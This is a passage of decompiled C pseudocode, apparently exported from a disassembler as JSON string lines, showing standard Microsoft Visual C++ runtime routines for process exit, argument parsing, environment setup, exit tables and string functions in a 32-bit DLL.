    "  __crt_seh_guarded_call<void>::operator()<_lambda_4fdada1b837b2abbf20876fac97688ad_,_lambda_b57350f2640456a0859d250846f69caf_ &,_lambda_eed5e4f92b5b7d55fa22c48c484aaa54_>(",
    "    &v4,",
    "    (int)v3,",
    "    v5);",
    "  if ( a3 == _crt_exit_terminate_process )",
    "  {",
    "    v5[0] = __acrt_get_process_end_policy() != 1 && (unsigned __int8)__acrt_app_verifier_enabled() == 0;",
    "    if ( a3 == _crt_exit_terminate_process )",
    "      sub_1001EE30(uExitCode, v5[0]);",
    "  }",
    "}",
    "",
    "",
    "void __cdecl  sub_1001EE30(UINT uExitCode, char a2)",
    "{",
    "  HANDLE CurrentProcess; // eax",
    "",
    "  if ( a2 )",
    "  {",
    "    CurrentProcess = GetCurrentProcess();",
    "    TerminateProcess(CurrentProcess, uExitCode);",
    "  }",
    "  try_cor_exit_process(uExitCode);",
    "  ExitProcess(uExitCode);",
    "}",
    "",
    "",
    "bool __scrt_is_managed_app()",
    "{",
    "  HMODULE ModuleHandleW; // eax",
    "  char *v1; // ecx",
    "  bool result; // al",
    "",
    "  ModuleHandleW = GetModuleHandleW(0);",
    "  result = ModuleHandleW",
    "        && *(_WORD *)ModuleHandleW == 23117",
    "        && (v1 = (char *)ModuleHandleW + *((_DWORD *)ModuleHandleW + 15), *(_DWORD *)v1 == 17744)",
    "        && *((_WORD *)v1 + 12) == 267",
    "        && *((_DWORD *)v1 + 29) > 0xEu",
    "        && *((_DWORD *)v1 + 58) != 0;",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl try_cor_exit_process(unsigned int a1)",
    "{",
    "  FARPROC CorExitProcess; // eax",
    "  HMODULE phModule; // [esp+8h] [ebp-10h] BYREF",
    "",
    "  phModule = 0;",
    "  if ( GetModuleHandleExW(0, L\"mscoree.dll\", &phModule) )",
    "  {",
    "    CorExitProcess = GetProcAddress(phModule, \"CorExitProcess\");",
    "    if ( CorExitProcess )",
    "      ((void (__thiscall *)(FARPROC, unsigned int))CorExitProcess)(CorExitProcess, a1);",
    "  }",
    "  if ( phModule )",
    "    FreeLibrary(phModule);",
    "}",
    "",
    "",
    "int __cdecl sub_1001EF22(int a1)",
    "{",
    "  int result; // eax",
    "",
    "  result = a1;",
    "  dword_10040228 = a1;",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl _cexit()",
    "{",
    "  common_exit(0, _crt_exit_full_cleanup, _crt_exit_return_to_caller);",
    "}",
    "",
    "",
    "void __cdecl  _exit(int Code)",
    "{",
    "  common_exit(Code, _crt_exit_no_cleanup, _crt_exit_terminate_process);",
    "}",
    "",
    "",
    "int sub_1001EF56()",
    "{",
    "  return dword_10040224;",
    "}",
    "",
    "",
    "int __cdecl common_configure_argv<char>(int a1)",
    "{",
    "  void *v2; // ebx",
    "  char *buffer_for_argv; // esi",
    "  int v4; // esi",
    "  int v5; // edi",
    "  void *v6; // edx",
    "  int v7; // ecx",
    "  _DWORD *i; // eax",
    "  int v9; // [esp+4h] [ebp-Ch] BYREF",
    "  void *Block; // [esp+8h] [ebp-8h] BYREF",
    "  int v11; // [esp+Ch] [ebp-4h] BYREF",
    "",
    "  if ( !a1 )",
    "    return 0;",
    "  if ( a1 != 2 && a1 != 1 )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "  __acrt_initialize_multibyte();",
    "  __acrt_GetModuleFileNameA(0, (int)&unk_10040230, 260);",
    "  dword_10040850 = (int)&unk_10040230;",
    "  v2 = (void *)dword_10040860;",
    "  if ( !dword_10040860 || !*(_BYTE *)dword_10040860 )",
    "    v2 = &unk_10040230;",
    "  v11 = 0;",
    "  v9 = 0;",
    "  sub_1001F09A(v2, 0, 0, &v11, &v9);",
    "  buffer_for_argv = (char *)__acrt_allocate_buffer_for_argv(v11, v9, 1);",
    "  if ( !buffer_for_argv )",
    "  {",
    "    v4 = 12;",
    "    *(_DWORD *)sub_1001E025() = 12;",
    "LABEL_13:",
    "    _free_base(0);",
    "    return v4;",
    "  }",
    "  sub_1001F09A(v2, buffer_for_argv, &buffer_for_argv[4 * v11], &v11, &v9);",
    "  if ( a1 == 1 )",
    "  {",
    "    dword_10040858 = buffer_for_argv;",
    "    dword_10040854 = v11 - 1;",
    "    v4 = 0;",
    "    goto LABEL_13;",
    "  }",
    "  Block = 0;",
    "  v5 = __acrt_expand_narrow_argv_wildcards(buffer_for_argv, &Block);",
    "  if ( v5 )",
    "  {",
    "    _free_base(Block);",
    "  }",
    "  else",
    "  {",
    "    v6 = Block;",
    "    v7 = 0;",
    "    for ( i = Block; *i; ++v7 )",
    "      ++i;",
    "    dword_10040854 = v7;",
    "    Block = 0;",
    "    dword_10040858 = v6;",
    "    _free_base(0);",
    "    v5 = 0;",
    "  }",
    "  Block = 0;",
    "  _free_base(buffer_for_argv);",
    "  return v5;",
    "}",
    "",
    "",
    "_DWORD *__cdecl sub_1001F09A(char *a1, char **a2, char *a3, _DWORD *a4, _DWORD *a5)",
    "{",
    "  char *v5; // esi",
    "  bool v7; // cl",
    "  char v8; // al",
    "  char v9; // al",
    "  char v10; // al",
    "  int v11; // edx",
    "  unsigned int v12; // eax",
    "  bool v13; // cl",
    "  char v14; // al",
    "  _DWORD *result; // eax",
    "  char v16; // [esp+Eh] [ebp-2h]",
    "  bool v17; // [esp+Fh] [ebp-1h]",
    "  bool v18; // [esp+Fh] [ebp-1h]",
    "",
    "  v5 = a3;",
    "  *a5 = 0;",
    "  *a4 = 1;",
    "  if ( a2 )",
    "    *a2++ = a3;",
    "  v7 = 0;",
    "  v17 = 0;",
    "  do",
    "  {",
    "    if ( *a1 == 34 )",
    "    {",
    "      v8 = 34;",
    "      v7 = !v7;",
    "      ++a1;",
    "      v17 = v7;",
    "    }",
    "    else",
    "    {",
    "      ++*a5;",
    "      if ( v5 )",
    "        *v5++ = *a1;",
    "      v9 = *a1++;",
    "      v16 = v9;",
    "      if ( _ismbblead(v9) )",
    "      {",
    "        ++*a5;",
    "        if ( v5 )",
    "          *v5++ = *a1;",
    "        ++a1;",
    "      }",
    "      v8 = v16;",
    "      if ( !v16 )",
    "      {",
    "        --a1;",
    "        goto LABEL_20;",
    "      }",
    "      v7 = v17;",
    "    }",
    "  }",
    "  while ( v7 || v8 != 32 && v8 != 9 );",
    "  if ( v5 )",
    "    *(v5 - 1) = 0;",
    "LABEL_20:",
    "  v18 = 0;",
    "LABEL_21:",
    "  v10 = *a1;",
    "  if ( *a1 )",
    "  {",
    "    while ( v10 == 32 || v10 == 9 )",
    "      v10 = *++a1;",
    "    if ( v10 )",
    "    {",
    "      if ( a2 )",
    "        *a2++ = v5;",
    "      ++*a4;",
    "      while ( 1 )",
    "      {",
    "        v11 = 1;",
    "        v12 = 0;",
    "        while ( *a1 == 92 )",
    "        {",
    "          ++a1;",
    "          ++v12;",
    "        }",
    "        if ( *a1 == 34 )",
    "          break;",
    "LABEL_43:",
    "        while ( v12 )",
    "        {",
    "          --v12;",
    "          if ( v5 )",
    "            *v5++ = 92;",
    "          ++*a5;",
    "        }",
    "        v14 = *a1;",
    "        if ( !*a1 || !v18 && (v14 == 32 || v14 == 9) )",
    "        {",
    "          if ( v5 )",
    "            *v5++ = 0;",
    "          ++*a5;",
    "          goto LABEL_21;",
    "        }",
    "        if ( v11 )",
    "        {",
    "          if ( v5 )",
    "            *v5++ = v14;",
    "          if ( _ismbblead(*a1) )",
    "          {",
    "            ++a1;",
    "            ++*a5;",
    "            if ( v5 )",
    "              *v5++ = *a1;",
    "          }",
    "          ++*a5;",
    "        }",
    "        ++a1;",
    "      }",
    "      if ( (v12 & 1) == 0 )",
    "      {",
    "        v13 = v18;",
    "        if ( v18 )",
    "        {",
    "          if ( a1[1] == 34 )",
    "          {",
    "            ++a1;",
    "            goto LABEL_39;",
    "          }",
    "          v13 = v18;",
    "        }",
    "        v11 = 0;",
    "        v18 = !v13;",
    "      }",
    "LABEL_39:",
    "      v12 >>= 1;",
    "      goto LABEL_43;",
    "    }",
    "  }",
    "  if ( a2 )",
    "    *a2 = 0;",
    "  result = a4;",
    "  ++*a4;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl __acrt_allocate_buffer_for_argv(unsigned int a1, unsigned int a2, unsigned int a3)",
    "{",
    "  int v3; // esi",
    "",
    "  if ( a1 >= 0x3FFFFFFF || a2 >= 0xFFFFFFFF / a3 || ~(4 * a1) <= a3 * a2 )",
    "    return 0;",
    "  v3 = sub_10023CF0(4 * a1 + a3 * a2, 1);",
    "  _free_base(0);",
    "  return v3;",
    "}",
    "",
    "",
    "errno_t __cdecl _configure_narrow_argv(_crt_argv_mode mode)",
    "{",
    "  return common_configure_argv<char>(mode);",
    "}",
    "",
    "",
    "int sub_1001F266()",
    "{",
    "  int result; // eax",
    "",
    "  result = dword_10040338;",
    "  if ( !dword_10040338 )",
    "  {",
    "    if ( !dword_1004033C",
    "      || common_initialize_environment_nolock<char>() && initialize_environment_by_cloning_nolock<char>() )",
    "    {",
    "      return 0;",
    "    }",
    "    else",
    "    {",
    "      return dword_10040338;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int common_initialize_environment_nolock<char>()",
    "{",
    "  char *narrow_environment_from_os; // eax",
    "  char *v2; // esi",
    "  void *v3; // eax",
    "  int v4; // edi",
    "",
    "  if ( dword_10040338 )",
    "    return 0;",
    "  __acrt_initialize_multibyte();",
    "  narrow_environment_from_os = (char *)__dcrt_get_narrow_environment_from_os();",
    "  v2 = narrow_environment_from_os;",
    "  if ( narrow_environment_from_os )",
    "  {",
    "    v3 = (void *)sub_1001F2EC(narrow_environment_from_os);",
    "    if ( v3 )",
    "    {",
    "      dword_10040344 = v3;",
    "      v4 = 0;",
    "      dword_10040338 = (int)v3;",
    "    }",
    "    else",
    "    {",
    "      v4 = -1;",
    "    }",
    "    _free_base(0);",
    "    _free_base(v2);",
    "    return v4;",
    "  }",
    "  else",
    "  {",
    "    _free_base(0);",
    "    return -1;",
    "  }",
    "}",
    "",
    "",
    "void *__cdecl sub_1001F2EC(char *Source)",
    "{",
    "  char *v1; // ebx",
    "  int v2; // ecx",
    "  char *v3; // esi",
    "  char i; // dl",
    "  int v5; // eax",
    "  void *v6; // eax",
    "  void *v7; // esi",
    "  unsigned int v9; // ecx",
    "  rsize_t v10; // eax",
    "  char *v11; // eax",
    "  char *v12; // edi",
    "  rsize_t SizeInBytes; // [esp+Ch] [ebp-8h]",
    "  char **v14; // [esp+10h] [ebp-4h]",
    "",
    "  v1 = Source;",
    "  v2 = 0;",
    "  v3 = Source;",
    "  for ( i = *Source; ; i = *v3 )",
    "  {",
    "    v5 = v2 + 1;",
    "    if ( !i )",
    "      break;",
    "    if ( i == 61 )",
    "      v5 = v2;",
    "    v2 = v5;",
    "    v3 += strlen(v3) + 1;",
    "  }",
    "  v6 = (void *)sub_10023CF0(v2 + 1, 4);",
    "  v7 = v6;",
    "  if ( !v6 )",
    "  {",
    "    _free_base(0);",
    "    return 0;",
    "  }",
    "  v14 = (char **)v6;",
    "  while ( 1 )",
    "  {",
    "    if ( !*v1 )",
    "    {",
    "      _free_base(0);",
    "      return v7;",
    "    }",
    "    v9 = strlen(v1);",
    "    v10 = v9 + 1;",
    "    SizeInBytes = v9 + 1;",
    "    if ( *v1 != 61 )",
    "      break;",
    "LABEL_13:",
    "    v1 += v10;",
    "  }",
    "  v11 = (char *)sub_10023CF0(v9 + 1, 1);",
    "  v12 = v11;",
    "  if ( v11 )",
    "  {",
    "    if ( strcpy_s(v11, SizeInBytes, v1) )",
    "      _invoke_watson(0, 0, 0, 0, 0);",
    "    *v14++ = v12;",
    "    _free_base(0);",
    "    v10 = SizeInBytes;",
    "    goto LABEL_13;",
    "  }",
    "  unknown_libname_24(v7);",
    "  _free_base(0);",
    "  _free_base(0);",
    "  return 0;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "void __cdecl unknown_libname_24(void **Block)",
    "{",
    "}int initialize_environment_by_cloning_nolock<char>()",
    "{",
    "  LPCWCH *v0; // edi",
    "  const WCHAR *v1; // eax",
    "  int v2; // eax",
    "  int v3; // ebx",
    "  CHAR *v4; // eax",
    "  CHAR *v5; // esi",
    "  CHAR *v7; // [esp-4h] [ebp-10h]",
    "",
    "  v0 = (LPCWCH *)dword_1004033C;",
    "  if ( dword_1004033C )",
    "  {",
    "    v1 = *(const WCHAR **)dword_1004033C;",
    "    if ( !*(_DWORD *)dword_1004033C )",
    "      return 0;",
    "    while ( 1 )",
    "    {",
    "      v2 = sub_10023952(0, 0, v1, -1, 0, 0, 0, 0);",
    "      v3 = v2;",
    "      if ( !v2 )",
    "        break;",
    "      v4 = (CHAR *)sub_10023CF0(v2, 1);",
    "      v5 = v4;",
    "      v7 = 0;",
    "      if ( !v4 )",
    "        goto LABEL_9;",
    "      if ( !sub_10023952(0, 0, *v0, -1, v4, v3, 0, 0) )",
    "      {",
    "        v7 = v5;",
    "LABEL_9:",
    "        _free_base(v7);",
    "        return -1;",
    "      }",
    "      __dcrt_set_variable_in_narrow_environment_nolock(v5, 0);",
    "      _free_base(0);",
    "      v1 = *++v0;",
    "      if ( !*v0 )",
    "        return 0;",
    "    }",
    "  }",
    "  return -1;",
    "}",
    "",
    "",
    "void __cdecl sub_1001F483(void ***a1)",
    "{",
    "  if ( *a1 != dword_10040344 )",
    "    unknown_libname_24(*a1);",
    "}",
    "",
    "",
    "void __cdecl sub_1001F49E(void ***a1)",
    "{",
    "  if ( *a1 != dword_10040340 )",
    "    unknown_libname_24(*a1);",
    "}",
    "",
    "",
    "// attributes: thunk",
    "int sub_1001F4B9(void)",
    "{",
    "}void __dcrt_uninitialize_environments_nolock()",
    "{",
    "  sub_1001F483((void ***)&dword_10040338);",
    "  sub_1001F49E((void ***)&dword_1004033C);",
    "  unknown_libname_24((void **)dword_10040344);",
    "  unknown_libname_24((void **)dword_10040340);",
    "}",
    "",
    "",
    "// attributes: thunk",
    "int common_initialize_environment_nolock<char>(void)",
    "{",
    "}int __stdcall sub_1001F514(_DWORD *a1, int a2, _DWORD *a3)",
    "{",
    "  int v4; // [esp+10h] [ebp-1Ch]",
    "",
    "  __acrt_lock(*a1);",
    "  v4 = unknown_libname_25(a2);",
    "  __acrt_unlock(*a3);",
    "  return v4;",
    "}",
    "",
    "",
    "int __stdcall sub_1001F56F(_DWORD *a1, int a2, _DWORD *a3)",
    "{",
    "  int v4; // [esp+10h] [ebp-1Ch]",
    "",
    "  __acrt_lock(*a1);",
    "  v4 = sub_1001F5CA(a2);",
    "  __acrt_unlock(*a3);",
    "  return v4;",
    "}",
    "",
    "",
    "int __thiscall sub_1001F5CA(int **this)",
    "{",
    "  int **v1; // edi",
    "  _DWORD *v2; // esi",
    "  void *v3; // edx",
    "  uintptr_t *v4; // ebx",
    "  unsigned int v5; // esi",
    "  unsigned int v6; // esi",
    "  int v7; // edi",
    "  size_t v8; // edi",
    "  char *v9; // ebx",
    "  unsigned int v10; // ecx",
    "  char *v13; // [esp+10h] [ebp-8h]",
    "  int v14; // [esp+14h] [ebp-4h]",
    "",
    "  v1 = this;",
    "  v2 = (_DWORD *)**this;",
    "  if ( v2 )",
    "  {",
    "    v3 = (void *)__ROR4__(__security_cookie ^ *v2, __security_cookie & 0x1F);",
    "    v4 = (uintptr_t *)__ROR4__(__security_cookie ^ v2[1], __security_cookie & 0x1F);",
    "    v5 = __ROR4__(__security_cookie ^ v2[2], __security_cookie & 0x1F);",
    "    v14 = (int)v3;",
    "    if ( v4 != (uintptr_t *)v5 )",
    "    {",
    "LABEL_16:",
    "      *v4 = unknown_libname_23(*v1[1]);",
    "      *(_DWORD *)**v1 = unknown_libname_23(v14);",
    "      *(_DWORD *)(**v1 + 4) = unknown_libname_23((int)(v4 + 1));",
    "      *(_DWORD *)(**v1 + 8) = unknown_libname_23(v5);",
    "      return 0;",
    "    }",
    "    v6 = (int)(v5 - (_DWORD)v3) >> 2;",
    "    v7 = v6;",
    "    if ( v6 > 0x200 )",
    "      v7 = 512;",
    "    v8 = v6 + v7;",
    "    if ( !v8 )",
    "      v8 = 32;",
    "    if ( v8 >= v6 )",
    "    {",
    "      v9 = (char *)_recalloc_base(v3, v8, 4u);",
    "      v13 = v9;",
    "      _free_base(0);",
    "      if ( v9 )",
    "      {",
    "LABEL_11:",
    "        v14 = (int)v9;",
    "        v4 = (uintptr_t *)&v9[4 * v6];",
    "        v5 = (unsigned int)&v13[4 * v8];",
    "        v10 = (v5 - (unsigned int)v4 + 3) >> 2;",
    "        if ( (unsigned int)v4 > v5 )",
    "          v10 = 0;",
    "        if ( v10 )",
    "          memset32(v4, __security_cookie, v10);",
    "        v1 = this;",
    "        goto LABEL_16;",
    "      }",
    "      v3 = (void *)v14;",
    "    }",
    "    v8 = v6 + 4;",
    "    v9 = (char *)_recalloc_base(v3, v6 + 4, 4u);",
    "    v13 = v9;",
    "    _free_base(0);",
    "    if ( v9 )",
    "      goto LABEL_11;",
    "  }",
    "  return -1;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_25(_DWORD **this)",
    "{",
    "}int __cdecl sub_1001F7B7(_onexit_t Function)",
    "{",
    "  return _register_onexit_function(&stru_10040348, Function);",
    "}",
    "",
    "",
    "int __cdecl _execute_onexit_table(_onexit_table_t *Table)",
    "{",
    "  int v2; // [esp+10h] [ebp-1Ch] BYREF",
    "  _onexit_table_t **p_Table; // [esp+14h] [ebp-18h] BYREF",
    "  _DWORD v4[5]; // [esp+18h] [ebp-14h] BYREF",
    "",
    "  p_Table = &Table;",
    "  v4[4] = 0;",
    "  v4[0] = 2;",
    "  v2 = 2;",
    "  return sub_1001F514(&v2, (int)&p_Table, v4);",
    "}",
    "",
    "",
    "int __cdecl _initialize_onexit_table(_onexit_table_t *Table)",
    "{",
    "  _PVFV *v2; // eax",
    "",
    "  if ( !Table )",
    "    return -1;",
    "  if ( Table->_first == Table->_end )",
    "  {",
    "    v2 = (_PVFV *)__security_cookie;",
    "    Table->_first = (_PVFV *)__security_cookie;",
    "    Table->_last = v2;",
    "    Table->_end = v2;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function)",
    "{",
    "  _DWORD v3[2]; // [esp+0h] [ebp-14h] BYREF",
    "  int v4; // [esp+8h] [ebp-Ch] BYREF",
    "  int v5; // [esp+Ch] [ebp-8h] BYREF",
    "",
    "  v3[0] = &Table;",
    "  v3[1] = &Function;",
    "  v5 = 2;",
    "  v4 = 2;",
    "  return sub_1001F56F(&v4, (int)v3, &v5);",
    "}",
    "",
    "",
    "char sub_1001F867()",
    "{",
    "  dword_10040368 = (struct __crt_locale_data *)&off_1003F1A8;",
    "  return 1;",
    "}",
    "",
    "",
    "char initialize_c()",
    "{",
    "  _initialize_onexit_table(&stru_10040348);",
    "  _initialize_onexit_table(&stru_10040354);",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_1001F88E()",
    "{",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_1001F891()",
    "{",
    "  __dcrt_uninitialize_environments_nolock();",
    "  return 1;",
    "}",
    "",
    "",
    "char __usercall initialize_pointers@<al>(int a1@<esi>)",
    "{",
    "  int v2; // [esp+0h] [ebp-8h]",
    "",
    "  sub_10018F0C(v2);",
    "  sub_1001E9A0(a1);",
    "  __acrt_initialize_signal_handlers(a1);",
    "  sub_100253C0(a1);",
    "  sub_1001EF22(a1);",
    "  return 1;",
    "}",
    "",
    "",
    "__vcrt_bool sub_1001F8C7()",
    "{",
    "  return __vcrt_uninitialize(0);",
    "}",
    "",
    "",
    "char uninitialize_allocated_memory()",
    "{",
    "  unknown_libname_26(&dword_10040844);",
    "  return 1;",
    "}",
    "",
    "",
    "char uninitialize_allocated_io_buffers()",
    "{",
    "  _free_base(dword_10040388);",
    "  dword_10040388 = 0;",
    "  _free_base(dword_1004038C);",
    "  dword_1004038C = 0;",
    "  _free_base(dword_10040858);",
    "  dword_10040858 = 0;",
    "  _free_base(dword_1004085C);",
    "  dword_1004085C = 0;",
    "  return 1;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "void __stdcall unknown_libname_26(void **a1)",
    "{",
    "}__crt_bool __cdecl __acrt_initialize()",
    "{",
    "  return __acrt_execute_initializers(&off_10031E60, &off_10031EE0);",
    "}",
    "",
    "",
    "bool sub_1001F977()",
    "{",
    "  return sub_1001FFFD() != 0;",
    "}",
    "",
    "",
    "char sub_1001F982()",
    "{",
    "  sub_1001FF68();",
    "  return 1;",
    "}",
    "",
    "",
    "__crt_bool __cdecl __acrt_uninitialize(__crt_bool Terminating)",
    "{",
    "  if ( !Terminating )",
    "    return __acrt_execute_uninitializers(&off_10031E60, &off_10031EE0);",
    "  if ( Block )",
    "    sub_10022924();",
    "  return 1;",
    "}",
    "",
    "",
    "__crt_bool __cdecl __acrt_uninitialize_critical(__crt_bool Terminating)",
    "{",
    "  __acrt_uninitialize_ptd(Terminating);",
    "  return 1;",
    "}",
    "",
    "",
    "void __cdecl _initterm(_PVFV *First, _PVFV *Last)",
    "{",
    "  _PVFV *i; // esi",
    "",
    "  for ( i = First; i != Last; ++i )",
    "  {",
    "    if ( *i )",
    "      ((void (__thiscall *)(_PVFV))*i)(*i);",
    "  }",
    "}",
    "",
    "",
    "int __cdecl _initterm_e(_PIFV *First, _PIFV *Last)",
    "{",
    "  int result; // eax",
    "",
    "  while ( First != Last )",
    "  {",
    "    if ( *First )",
    "    {",
    "      result = ((int (__thiscall *)(_PIFV))*First)(*First);",
    "      if ( result )",
    "        return result;",
    "    }",
    "    ++First;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "void  terminate()",
    "{",
    "  void (__thiscall *v0)(_DWORD); // esi",
    "",
    "  v0 = *(void (__thiscall **)(_DWORD))(sub_1001FFAC() + 12);",
    "  if ( v0 )",
    "    v0(v0);",
    "  abort();",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void j_nullsub_1()",
    "{",
    "}errno_t __cdecl strcpy_s(char *Destination, rsize_t SizeInBytes, const char *Source)",
    "{",
    "  rsize_t v3; // ecx",
    "  _DWORD *v4; // eax",
    "  errno_t v5; // esi",
    "  char *v7; // edi",
    "  char v8; // al",
    "  int v9; // [esp-4h] [ebp-Ch]",
    "",
    "  if ( !Destination || (v3 = SizeInBytes) == 0 )",
    "  {",
    "LABEL_5:",
    "    v4 = sub_1001E025();",
    "    v9 = 22;",
    "LABEL_6:",
    "    v5 = v9;",
    "    *v4 = v9;",
    "    _invalid_parameter_noinfo();",
    "    return v5;",
    "  }",
    "  if ( !Source )",
    "  {",
    "    *Destination = 0;",
    "    goto LABEL_5;",
    "  }",
    "  v7 = Destination;",
    "  while ( 1 )",
    "  {",
    "    v8 = v7[Source - Destination];",
    "    *v7++ = v8;",
    "    if ( !v8 )",
    "      return 0;",
    "    if ( !--v3 )",
    "    {",
    "      *Destination = 0;",
    "      v4 = sub_1001E025();",
    "      v9 = 34;",
    "      goto LABEL_6;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)",
    "{",
    "  const char *v3; // edx",
    "  size_t v4; // ebx",
    "  int v5; // ecx",
    "  unsigned __int8 v6; // al",
    "  bool v7; // cc",
    "  int v8; // eax",
    "",
    "  v3 = Str2;",
    "  v4 = MaxCount;",
    "  if ( !MaxCount )",
    "    return 0;",
    "  v5 = Str1 - Str2;",
    "  if ( ((unsigned __int8)Str2 & 3) != 0 )",
    "    goto comp_head_loop_begin;",
    "_dword_loop_begin:",
    "  while ( (((_WORD)v5 + (_WORD)v3) & 0xFFFu) <= 0xFFC )",
    "  {",
    "    v8 = *(_DWORD *)&v3[v5];",
    "    if ( v8 != *(_DWORD *)v3 )",
    "      break;",
    "    v7 = v4 <= 4;",
    "    v4 -= 4;",
    "    if ( !v7 )",
    "    {",
    "      v3 += 4;",
    "      if ( ((v8 - 16843009) & ~v8 & 0x80808080) == 0 )",
    "        continue;",
    "    }",
    "    return 0;",
    "  }",
    "comp_head_loop_begin:",
    "  while ( 1 )",
    "  {",
    "    v6 = v3[v5];",
    "    if ( v6 != *v3 )",
    "      return v6 < (unsigned int)*v3 ? -1 : 1;",
    "    if ( !v3[v5] )",
    "      return 0;",
    "    ++v3;",
    "    v7 = v4-- <= 1;",
    "    if ( v7 )",
    "      return 0;",
    "    if ( ((unsigned __int8)v3 & 3) == 0 )",
    "      goto _dword_loop_begin;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount)",
    "{",
    "  int result; // eax",
    "",
    "  result = MaxCount;",
    "  if ( MaxCount )",
    "  {",
    "    while ( --result && *String1 && *String1 == *String2 )",
    "    {",
    "      ++String1;",
    "      ++String2;",
    "    }",
    "    return *String1 - *String2;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_15ade71b0218206bbe3333a0c9b79046_,_lambda_da44e0f8b0f19ba52fefafb335991732_ &,_lambda_207f2d024fc103971653565357d6cd41_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3)",
    "{",
    "  __acrt_lock(*a1);",
    "  _InterlockedIncrement(*(volatile signed __int32 **)(**(_DWORD **)a2 + 72));",
    "  return __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_38edbb1296d33220d7e4dd0ed76b244a_,_lambda_5ce1d447e08cb34b2473517608e21441_ &,_lambda_fb385d3da700c9147fc39e65dd577a8c_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3)",
    "{",
    "  void *v3; // ecx",
    "",
    "  __acrt_lock(*a1);",
    "  v3 = *(void **)(**(_DWORD **)a2 + 72);",
    "  if ( v3 && !_InterlockedExchangeAdd((volatile signed __int32 *)v3, 0xFFFFFFFF) && v3 != &unk_1003F540 )",
    "    _free_base(v3);",
    "  return __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_6affb1475c98b40b75cdec977db92e3c_,_lambda_b8d4b9c228a6ecc3f80208dbb4b4a104_ &,_lambda_608742c3c92a14382c1684fc64f96c88_>(",
    "        _DWORD *a1,",
    "        struct __acrt_ptd *const **a2,",
    "        _DWORD *a3)",
    "{",
    "  __acrt_lock(*a1);",
    "  replace_current_thread_locale_nolock(**a2, 0);",
    "  return __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_a7e850c220f1c8d1e6efeecdedd162c6_,_lambda_46720907175c18b6c9d2717bc0d2d362_ &,_lambda_9048902d66e8d99359bc9897bbb930a8_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3)",
    "{",
    "  __acrt_lock(*a1);",
    "  replace_current_thread_locale_nolock(",
    "    **(struct __acrt_ptd *const **)a2,",
    "    ***(struct __crt_locale_data *const ***)(a2 + 4));",
    "  return __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "void __cdecl construct_ptd(struct __acrt_ptd *const a1, struct __crt_locale_data **const a2)",
    "{",
    "  int v2; // [esp+0h] [ebp-14h] BYREF",
    "  int v3; // [esp+4h] [ebp-10h] BYREF",
    "  struct __acrt_ptd *const *v4; // [esp+8h] [ebp-Ch] BYREF",
    "  int v5; // [esp+Ch] [ebp-8h] BYREF",
    "",
    "  *((_DWORD *)a1 + 6) = 1;",
    "  *(_DWORD *)a1 = &unk_10031D98;",
    "  *((_DWORD *)a1 + 212) = 1;",
    "  *((_DWORD *)a1 + 18) = &unk_1003F540;",
    "  *((_WORD *)a1 + 54) = 67;",
    "  *((_WORD *)a1 + 185) = 67;",
    "  *((_DWORD *)a1 + 211) = 0;",
    "  v3 = (int)&a1;",
    "  v5 = 5;",
    "  v2 = 5;",
    "  __crt_seh_guarded_call<void>::operator()<_lambda_15ade71b0218206bbe3333a0c9b79046_,_lambda_da44e0f8b0f19ba52fefafb335991732_ &,_lambda_207f2d024fc103971653565357d6cd41_>(",
    "    &v2,",
    "    (int)&v3,",
    "    &v5);",
    "  v4 = &a1;",
    "  v5 = (int)&a2;",
    "  v2 = 4;",
    "  v3 = 4;",
    "  __crt_seh_guarded_call<void>::operator()<_lambda_a7e850c220f1c8d1e6efeecdedd162c6_,_lambda_46720907175c18b6c9d2717bc0d2d362_ &,_lambda_9048902d66e8d99359bc9897bbb930a8_>(",
    "    &v3,",
    "    (int)&v4,",
    "    &v2);",
    "}",
    "",
    "",
    "void __stdcall destroy_fls(struct __acrt_ptd *Block)",
    "{",
    "  if ( Block )",
    "  {",
    "    destroy_ptd(Block);",
    "    _free_base(Block);",
    "  }",
    "}",
    "",
    "",
    "void __cdecl destroy_ptd(void **a1)",
    "{",
    "  void **v1; // eax",
    "  int v2; // [esp+0h] [ebp-10h] BYREF",
    "  void ***v3; // [esp+4h] [ebp-Ch] BYREF",
    "  int v4; // [esp+8h] [ebp-8h] BYREF",
    "",
    "  v1 = a1;",
    "  if ( *a1 != &unk_10031D98 )",
    "  {",
    "    _free_base(*a1);",
    "    v1 = a1;",
    "  }",
    "  _free_base(v1[15]);",
    "  _free_base(a1[12]);",
    "  _free_base(a1[13]);",
    "  _free_base(a1[14]);",
    "  _free_base(a1[10]);",
    "  _free_base(a1[11]);",
    "  _free_base(a1[16]);",
    "  _free_base(a1[17]);",
    "  _free_base(a1[216]);",
    "  v3 = &a1;",
    "  v4 = 5;",
    "  v2 = 5;",
